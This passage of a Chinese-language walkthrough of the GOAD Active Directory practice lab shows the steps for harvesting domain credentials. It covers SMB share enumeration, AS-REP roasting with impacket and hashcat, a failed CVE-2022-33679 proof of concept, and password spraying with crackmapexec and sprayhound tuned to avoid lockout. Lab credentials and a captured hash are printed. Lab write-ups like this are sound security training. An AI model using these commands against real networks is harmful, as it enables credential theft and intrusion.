SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\a: 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\a: 
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public                          Basic Read share for all domain users
```

## 获得用户密码

知道用户名,获取密码,两种方式:

* AS-REP Roast

* Password spray密码喷洒

### AS-REP Roast

[AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
>AS-REP烤饼(AS-REP roasting)是一种技术，可以获取选择了**不需要Kerberos预身份验证标志**的用户的密码哈希值

>禁用预授权是一种危险的错误配置，攻击者可以简单地查询 KDC 以查找禁用预身份验证的用户，然后为每个用户请求 TGT，然后 TGT 可以从内存中转储并在暴力密码破解攻击中脱机使用，如果密码被破解，则攻击者将拥有域用户的有密码铭文

根据之前结果制作[字典](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/north.sevenkingdoms.local-users.txt)

```bash
impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile north.sevenkingdoms.local-users.txt
```

```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:30a743660db54d8c4207ddead8d482d5$639bf91110289d44bf8e5bc52610fb3b143df403804d2a2e569bc8ed306b3cb239b37124655cd3849ba2b76afe8bacb99410795d71b69ac7dfd04878f0b5418cb5cbd6331cb9aef0001183e2b6c3bc79523642632fdeb2ae5e6bda416b700869a2e7304c6db791808b9db7c69c9718c7f863851229ecf788d7996e0ee64a07b7c05af310a4d6653069262200723927e20a963b5c2fb545ff4f8e69e021d75790d0916be457a8aff298f7a0dc4410bf408ab0bcec67b12dafda8fd1563162e01bd91e3e011cbdd68d6aa6241e2699d607ce3e4c11830f8f8edbfc358fe8fb7fa47715c377a555fa96d3d0baf3d2aad9418b13a650671caa8aa2ba2bc7e91e8411c83849814a9c
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

GetNPUsers摘要:
>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容,

hashcat破解[brandon.stark.hash](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/brandon.stark.hash)

```bash
hashcat -a 0 -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
```

现在已经知道的域的用户和密码:

* samwell.tarly:Heartsbane(用户描述)
* brandon.stark:iseedeadpeople(AS-REP Roasting)

### CVE-2022-33679

该攻击针对已禁用预身份验证的 Windows 域帐户，并尝试进行加密降级攻击,适用范围使用禁用预身份验证和 RC4-MD4 加密方案

发布到 Github的 [PoC](https://github.com/Bdenneu/CVE-2022-33679)

```bash
python3 CVE-2022-33679.py north.sevenkingdoms.local/brandon.stark 192.168.56.11
```

```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT - Retrieving AS-REP
[-]  RC4 is not supported
```

没成功

### Password Spray密码喷洒

>密码喷洒属于密码猜测的一种，避免对用户连续测试导致账户被锁定，属于用固定密码尝试所有用户

使用CME

```bash
 crackmapexec smb 192.168.56.11 -u north.sevenkingdoms.local-users.txt -p north.sevenkingdoms.local-users.txt --no-bruteforce --continue-on-succes
 ```

 ```bash
 SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:sql_svc STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\jon.snow:jon.snow STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\rickon.stark:rickon.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brandon.stark:brandon.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sansa.stark:sansa.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\robb.stark:robb.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\eddard.stark:eddard.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\vagrant:vagrant (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\Administrator:Administrator STATUS_LOGON_FAILURE 
```

我们可以用有效用户尝试 sprayhound 以避免锁定帐户

选项-t设置是剩余尝试次数,如果设置为2，并且密码策略在 5 次登录失败后锁定帐户，则sprayhound将不会测试badpwdcount为3(及更多)的用户

```bash
# User as pass with password lowercase

sprayhound -U north.sevenkingdoms.local-users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2
```

```bash
[+] Login successful
[+] Successfully retrieved password policy (Threshold: 5)
[+] Successfully retrieved 16 users
[+] 4 users will be tested
[+] 12 users will not be tested
    Continue? [Y/n] Y
    Continue? [Y/n] y
[+] [  VALID  ] vagrant : vagrant
[+] [  VALID  ] hodor : hodor
[+] 2 user(s) have been owned !
    Do you want to set them as 'owned' in Bloodhound ? [Y/n] n
[!] Ok, master. Bye.
```

用CME查看下锁定次数

```bash
crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
```

```bash
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        badpwdcount: 3 desc: sql service
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   badpwdcount: 3 desc: Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  badpwdcount: 3 desc: Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       badpwdcount: 3 desc: Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          badpwdcount: 0 desc: Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   badpwdcount: 3 desc: Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  badpwdcount: 3 desc: Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    badpwdcount: 3 desc: Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\robb.stark                     badpwdcount: 0 desc: Robb Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\catelyn.stark                  badpwdcount: 3 desc: Catelyn Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\eddard.stark                   badpwdcount: 1 desc: Eddard Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     badpwdcount: 3 desc: Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\vagrant                        badpwdcount: 0 desc: Vagrant User
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```

现在获得了三对凭据：

* north.sevenkingdoms.local\samwell.tarly:Heartsbane(用户描述)
* north.sevenkingdoms.local\brandon.stark:iseedeadpeople(AS-REP Roasting)
* north.sevenkingdoms.local\hodor:hodor(密码喷洒)
* ~~vagrant:vagrant(密码喷洒)~~
